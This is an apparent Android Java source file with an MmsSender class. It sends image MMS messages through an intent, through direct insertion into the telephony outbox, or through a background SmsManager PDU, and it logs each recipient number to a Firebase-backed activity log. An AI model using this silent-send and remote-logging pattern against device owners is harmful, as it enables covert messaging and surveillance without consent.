package com.labs.labrats;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.telephony.CarrierConfigManager;
import android.telephony.SmsManager;
import android.telephony.SubscriptionManager;
import android.util.Log;
import android.webkit.MimeTypeMap;

import androidx.core.content.FileProvider;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

import android.content.ContentValues;
import android.content.ContentUris;

public class MmsSender {
    private static final String TAG = "MmsSender";
    private static final String ACTION_MMS_SENT = "com.labs.labrats.MMS_SENT";

    public static boolean send(Context context, String number, String text, File sourceImage) {
        try {
            if (sourceImage == null || !sourceImage.exists()) {
                Log.e(TAG, "MMS Error: Source image file does not exist");
                return false;
            }

            if (sourceImage.length() > 1024 * 1024) {
                Log.e(TAG, "MMS Error: File too large (> 1MB)");
                return false;
            }

            String[] mimeAndExt = getMimeAndExtension(sourceImage);
            String mimeType = mimeAndExt[0];
            String ext = mimeAndExt[1];

            // Ensure sourceImage has a valid file extension matching its magic bytes
            File imageFile = sourceImage;
            if (!sourceImage.getName().toLowerCase().endsWith("." + ext)) {
                imageFile = new File(context.getCacheDir(), "mms_attachment_" + System.currentTimeMillis() + "." + ext);
                try (FileInputStream fis = new FileInputStream(sourceImage);
                     FileOutputStream fos = new FileOutputStream(imageFile)) {
                    byte[] buf = new byte[8192];
                    int len;
                    while ((len = fis.read(buf)) != -1) {
                        fos.write(buf, 0, len);
                    }
                    fos.flush();
                }
            }

            // 1. Try Intent-based direct dispatch (launches native messaging app with pre-loaded recipient, text, and attached image)
            boolean intentSuccess = sendViaIntent(context, number, text, imageFile, mimeType);
            if (intentSuccess) {
                Log.d(TAG, "MMS successfully dispatched via Intent to " + number);
                FirebaseConfig.logActivity("COMMS_SENT: MMS composer launched with media attachment for " + number);
                return true;
            }

            // 2. Try Telephony Provider Outbox insertion fallback
            boolean outboxSuccess = sendViaOutbox(context, number, text, imageFile, mimeType);
            if (outboxSuccess) {
                Log.d(TAG, "MMS successfully dispatched via Telephony Outbox to " + number);
                FirebaseConfig.logActivity("COMMS_SENT: MMS media dispatched via Outbox to " + number);
                return true;
            }

            // 3. Fallback to background SmsManager sendMultimediaMessage with binary PDU
            try {
                byte[] pdu = composePdu(number, text, imageFile, mimeType);
                
                File mmsDir = new File(context.getFilesDir(), "mms_pdus");
                mmsDir.mkdirs();
                cleanupOldPdus(mmsDir);

                String fileName = "mms_" + System.currentTimeMillis() + "_" + Math.abs(number.hashCode()) + ".pdu";
                File pduFile = new File(mmsDir, fileName);
                try (FileOutputStream fos = new FileOutputStream(pduFile)) {
                    fos.write(pdu);
                    fos.flush();
                }

                Uri contentUri = FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", pduFile);
                
                String[] telephonyPkgs = {
                    "com.android.phone",
                    "com.android.providers.telephony",
                    "com.google.android.apps.messaging",
                    "com.samsung.android.messaging",
                    "com.android.mms"
                };
                for (String pkg : telephonyPkgs) {
                    try {
                        context.grantUriPermission(pkg, contentUri, Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                    } catch (Exception ignored) {}
                }

                SmsManager smsManager = getSmsManager(context);
                registerMmsSentReceiver(context, number);

                Intent mmsIntent = new Intent(ACTION_MMS_SENT);
                mmsIntent.setPackage(context.getPackageName());
                mmsIntent.putExtra("pdu_path", pduFile.getAbsolutePath());

                int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    pendingFlags |= PendingIntent.FLAG_MUTABLE;
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
                }

                PendingIntent sentIntent = PendingIntent.getBroadcast(
                    context, (int) System.currentTimeMillis(), mmsIntent, pendingFlags
                );

                smsManager.sendMultimediaMessage(context, contentUri, null, null, sentIntent);
                Log.d(TAG, "MMS binary PDU dispatched in background to SmsManager for " + number);
                FirebaseConfig.logActivity("COMMS_DISPATCH: MMS PDU submitted to Telephony stack for " + number);
                return true;
            } catch (Exception ex) {
                Log.w(TAG, "Background PDU dispatch failed: " + ex.getMessage());
            }

            return false;
        } catch (Exception e) {
            Log.e(TAG, "MMS Error: " + e.getMessage(), e);
            FirebaseConfig.logActivity("SYSTEM_ERROR: MMS dispatch failed: " + e.getMessage());
            return false;
        }
    }

    private static boolean sendViaOutbox(Context context, String number, String text, File imageFile, String mimeType) {
        try {
            ContentValues values = new ContentValues();
            values.put("msg_box", 4); // 4 = OUTBOX
            values.put("date", System.currentTimeMillis() / 1000L);
            values.put("read", 1);
            values.put("seen", 1);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                int subId = SubscriptionManager.getDefaultSmsSubscriptionId();
                if (subId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                    values.put("sub_id", subId);
                }
            }

            Uri outboxUri = context.getContentResolver().insert(Uri.parse("content://mms/outbox"), values);
            if (outboxUri == null) return false;
            long msgId = ContentUris.parseId(outboxUri);

            // Insert image part
            ContentValues partValues = new ContentValues();
            partValues.put("msg_id", msgId);
            partValues.put("ct", mimeType);
            partValues.put("name", imageFile.getName());
            partValues.put("cl", imageFile.getName());
            partValues.put("cid", "<image>");
            Uri partUri = context.getContentResolver().insert(Uri.parse("content://mms/part"), partValues);
            if (partUri != null) {
                try (OutputStream os = context.getContentResolver().openOutputStream(partUri);
                     FileInputStream fis = new FileInputStream(imageFile)) {
                    byte[] buf = new byte[8192];
                    int len;
                    while ((len = fis.read(buf)) != -1) {
                        os.write(buf, 0, len);
                    }
                }
            }

            // Insert text part if present
            if (text != null && !text.trim().isEmpty()) {
                ContentValues textPart = new ContentValues();
                textPart.put("msg_id", msgId);
                textPart.put("ct", "text/plain");
                textPart.put("cl", "text.txt");
                textPart.put("cid", "<text>");
                Uri tPartUri = context.getContentResolver().insert(Uri.parse("content://mms/part"), textPart);
                if (tPartUri != null) {
                    try (OutputStream os = context.getContentResolver().openOutputStream(tPartUri)) {
                        os.write(text.trim().getBytes(StandardCharsets.UTF_8));
                    }
                }
            }

            // Insert recipient address
            ContentValues addr = new ContentValues();
            addr.put("msg_id", msgId);
            addr.put("address", number.replaceAll("[^0-9+]", ""));
            addr.put("type", 137); // TO
            addr.put("charset", 106); // UTF-8
            context.getContentResolver().insert(Uri.parse("content://mms/" + msgId + "/addr"), addr);

            // Notify telephony provider to trigger sending
            context.getContentResolver().notifyChange(Uri.parse("content://mms-sms/"), null);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "Outbox insertion attempt failed: " + e.getMessage());
            return false;
        }
    }

    private static boolean sendViaIntent(Context context, String number, String text, File imageFile, String mimeType) {
        try {
            Uri contentUri = FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", imageFile);
            
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.setType(mimeType != null ? mimeType : "image/*");
            intent.putExtra(Intent.EXTRA_STREAM, contentUri);
            intent.putExtra("address", number);
            intent.putExtra("sms_body", text != null ? text : "");
            
            // Target device's default SMS app directly to bypass generic share sheet chooser
            String defaultSmsPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(context);
            if (defaultSmsPkg != null && !defaultSmsPkg.isEmpty()) {
                intent.setPackage(defaultSmsPkg);
            } else {
                intent.setPackage("com.google.android.apps.messaging");
            }

            android.content.ClipData clipData = android.content.ClipData.newUri(context.getContentResolver(), "media", contentUri);
            intent.setClipData(clipData);
            
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            String[] pkgs = {"com.google.android.apps.messaging", "com.samsung.android.messaging", "com.android.mms", "com.android.phone"};
            for (String pkg : pkgs) {
                try {
                    context.grantUriPermission(pkg, contentUri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                } catch (Exception ignored) {}
            }

            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            try {
                Uri contentUri = FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", imageFile);
                Intent intent = new Intent(Intent.ACTION_SEND);
                intent.setType(mimeType != null ? mimeType : "image/*");
                intent.putExtra(Intent.EXTRA_STREAM, contentUri);
                intent.putExtra("address", number);
                intent.putExtra("sms_body", text != null ? text : "");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(Intent.createChooser(intent, "Send MMS"));
                return true;
            } catch (Exception ex) {
                Log.w(TAG, "Intent MMS dispatch failed: " + ex.getMessage());
                return false;
            }
        }
    }

    private static SmsManager getSmsManager(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return context.getSystemService(SmsManager.class);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            int subId = SubscriptionManager.getDefaultSmsSubscriptionId();
            if (subId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                return SmsManager.getSmsManagerForSubscriptionId(subId);
            }
        }
        return SmsManager.getDefault();
    }

    @SuppressWarnings("MissingPermission")
    private static Bundle getCarrierConfigOverrides(Context context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                CarrierConfigManager carrierConfigManager = context.getSystemService(CarrierConfigManager.class);
                if (carrierConfigManager != null) {
                    PersistableBundle pBundle = carrierConfigManager.getConfig();
                    if (pBundle != null) {
                        Bundle bundle = new Bundle();
                        for (String key : pBundle.keySet()) {
                            Object val = pBundle.get(key);
                            if (val instanceof String) bundle.putString(key, (String) val);
                            else if (val instanceof Integer) bundle.putInt(key, (Integer) val);
                            else if (val instanceof Boolean) bundle.putBoolean(key, (Boolean) val);
                        }
                        return bundle;
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Failed to retrieve CarrierConfig overrides: " + e.getMessage());
        }
        return null;
    }

    private static void registerMmsSentReceiver(Context context, String recipientNumber) {
        try {
            BroadcastReceiver receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    try {
                        int resultCode = getResultCode();
                        int httpStatus = intent.getIntExtra("android.telephony.extra.MMS_HTTP_STATUS", 0);
                        int errorCode = intent.getIntExtra("android.telephony.extra.MMS_ERROR_CODE", 0);

                        if (resultCode == Activity.RESULT_OK) {
                            Log.d(TAG, "MMS Sent successfully to " + recipientNumber);
                            FirebaseConfig.logActivity("COMMS_SENT: MMS media delivered to " + recipientNumber);
                        } else {
                            Log.e(TAG, "MMS Send Failed. ResultCode: " + resultCode + ", ErrorCode: " + errorCode + ", HTTP: " + httpStatus);
                            FirebaseConfig.logActivity("COMMS_ERROR: MMS delivery failed for " + recipientNumber + " (Code: " + resultCode + ", Error: " + errorCode + ", HTTP: " + httpStatus + ")");
                        }
                        ctx.getApplicationContext().unregisterReceiver(this);
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing MMS_SENT broadcast: " + e.getMessage());
                    }
                }
            };

            if (Build.VERSION.SDK_INT >= 33) {
                context.getApplicationContext().registerReceiver(receiver, new IntentFilter(ACTION_MMS_SENT), Context.RECEIVER_EXPORTED);
            } else {
                context.getApplicationContext().registerReceiver(receiver, new IntentFilter(ACTION_MMS_SENT));
            }
        } catch (Exception e) {
            Log.w(TAG, "Failed to register MMS_SENT receiver: " + e.getMessage());
        }
    }

    private static String[] getMimeAndExtension(File file) {
        String mime = "image/jpeg";
        String ext = "jpg";
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] header = new byte[8];
            int read = fis.read(header);
            if (read >= 4) {
                if (header[0] == (byte) 0x89 && header[1] == (byte) 0x50 && header[2] == (byte) 0x4E && header[3] == (byte) 0x47) {
                    mime = "image/png";
                    ext = "png";
                } else if (header[0] == (byte) 0xFF && header[1] == (byte) 0xD8) {
                    mime = "image/jpeg";
                    ext = "jpg";
                } else if (header[0] == (byte) 0x47 && header[1] == (byte) 0x49 && header[2] == (byte) 0x46) {
                    mime = "image/gif";
                    ext = "gif";
                } else if (header[0] == (byte) 0x52 && header[1] == (byte) 0x49 && header[2] == (byte) 0x46 && header[3] == (byte) 0x46) {
                    mime = "image/webp";
                    ext = "webp";
                }
            }
        } catch (Exception ignored) {}
        return new String[]{mime, ext};
    }

    private static byte[] composePdu(String number, String text, File imageFile, String defaultMimeType) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        
        // 1. Message Type: X-Mms-Message-Type (0x8C) -> m-send-req (0x80)
        baos.write(0x8C); baos.write(0x80);
        
        // 2. Transaction ID: X-Mms-Transaction-ID (0x98)
        String trId = "T" + System.currentTimeMillis();
        baos.write(0x98); baos.write(trId.getBytes(StandardCharsets.UTF_8)); baos.write(0x00);
        
        // 3. MMS Version: X-Mms-MMS-Version (0x8D) -> 1.2 (0x92)
        baos.write(0x8D); baos.write(0x92);
        
        // 4. From: X-Mms-From (0x89) -> Length (1) + Insert-Address-Token (0x81)
        baos.write(0x89); baos.write(0x01); baos.write(0x81);
        
        // 5. To: X-Mms-To (0x97) -> Address string
        String recipient = number.replaceAll("[^0-9+]", "");
        if (!recipient.contains("/")) {
            recipient += "/TYPE=PLMN";
        }
        baos.write(0x97); baos.write(recipient.getBytes(StandardCharsets.UTF_8)); baos.write(0x00);

        // Detect true magic bytes MIME type and clean image file name
        String[] mimeAndExt = getMimeAndExtension(imageFile);
        String mimeType = mimeAndExt[0];
        String ext = mimeAndExt[1];
        String imagePartName = "image." + ext;

        // 6. Content-Type: X-Mms-Content-Type (0x84) -> application/vnd.wap.multipart.related (0x33 | 0x80 = 0xB3)
        ByteArrayOutputStream ctParams = new ByteArrayOutputStream();
        ctParams.write(0xB3); // application/vnd.wap.multipart.related
        
        // Parameter: Type (0x89) -> mimeType
        ctParams.write(0x89);
        ctParams.write(mimeType.getBytes(StandardCharsets.UTF_8));
        ctStreamWriteNull(ctParams);
        
        // Parameter: Start (0x8A) -> <image>
        ctParams.write(0x8A);
        ctParams.write("<image>".getBytes(StandardCharsets.UTF_8));
        ctStreamWriteNull(ctParams);

        byte[] ctBytes = ctParams.toByteArray();
        baos.write(0x84); // X-Mms-Content-Type Header Key
        writeUintvar(baos, ctBytes.length);
        baos.write(ctBytes);

        // Compose body parts
        byte[] imgData = readFile(imageFile);
        boolean hasText = (text != null && !text.trim().isEmpty());
        String textStr = hasText ? text.trim() : "";
        
        int partCount = hasText ? 2 : 1; // Image (+ Text)
        
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        writeUintvar(body, partCount);
        
        // Part 1: Image
        writePart(body, imgData, mimeType, "<image>", imagePartName);
        
        // Part 2: Text (if present)
        if (hasText) {
            writePart(body, textStr.getBytes(StandardCharsets.UTF_8), "text/plain", "<text>", "text.txt");
        }
        
        baos.write(body.toByteArray());
        return baos.toByteArray();
    }

    private static void ctStreamWriteNull(ByteArrayOutputStream out) {
        out.write(0x00);
    }

    private static void writePart(ByteArrayOutputStream out, byte[] data, String mime, String contentId, String contentLocation) throws IOException {
        ByteArrayOutputStream header = new ByteArrayOutputStream();
        
        // 1. Content-Type Header (WSP Well-Known Short-Codes)
        if (mime.contains("png")) {
            header.write(0x9A); // image/png (0x1A | 0x80 = 0x9A)
        } else if (mime.contains("gif")) {
            header.write(0x9D); // image/gif (0x1D | 0x80 = 0x9D)
        } else if (mime.startsWith("text/plain")) {
            header.write(0x83); // text/plain (0x03 | 0x80 = 0x83)
            header.write(0x81); // Parameter: Charset
            header.write(0xEA); // UTF-8 (106 | 0x80 = 0xEA)
        } else {
            header.write(0x90); // image/jpeg (0x10 | 0x80 = 0x90)
        }
        
        // 2. Content-Location (0x8E)
        header.write(0x8E);
        header.write(contentLocation.getBytes(StandardCharsets.UTF_8));
        header.write(0x00);

        // 3. Content-ID (0xC0)
        header.write(0xC0);
        header.write(contentId.getBytes(StandardCharsets.UTF_8));
        header.write(0x00);

        // 4. Content-Disposition: inline (0xAE -> 0x80)
        header.write(0xAE);
        header.write(0x80);

        byte[] headerBytes = header.toByteArray();
        
        writeUintvar(out, headerBytes.length);
        writeUintvar(out, data.length);
        out.write(headerBytes);
        out.write(data);
    }

    private static void cleanupOldPdus(File dir) {
        try {
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    long now = System.currentTimeMillis();
                    for (File f : files) {
                        if (now - f.lastModified() > 24 * 3600 * 1000L) {
                            f.delete();
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private static void writeUintvar(OutputStream out, int value) throws IOException {
        int temp = value;
        byte[] buf = new byte[5];
        int ptr = 0;
        do {
            buf[ptr++] = (byte) (temp & 0x7F);
            temp >>>= 7;
        } while (temp != 0);
        while (ptr > 1) {
            out.write(buf[--ptr] | 0x80);
        }
        out.write(buf[0]);
    }

    private static byte[] readFile(File file) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) != -1) bos.write(buf, 0, len);
        }
        return bos.toByteArray();
    }

    private static String getMimeType(String url) {
        String type = null;
        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
        if (extension != null) {
            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension.toLowerCase());
        }
        return (type == null) ? "image/jpeg" : type;
    }
}
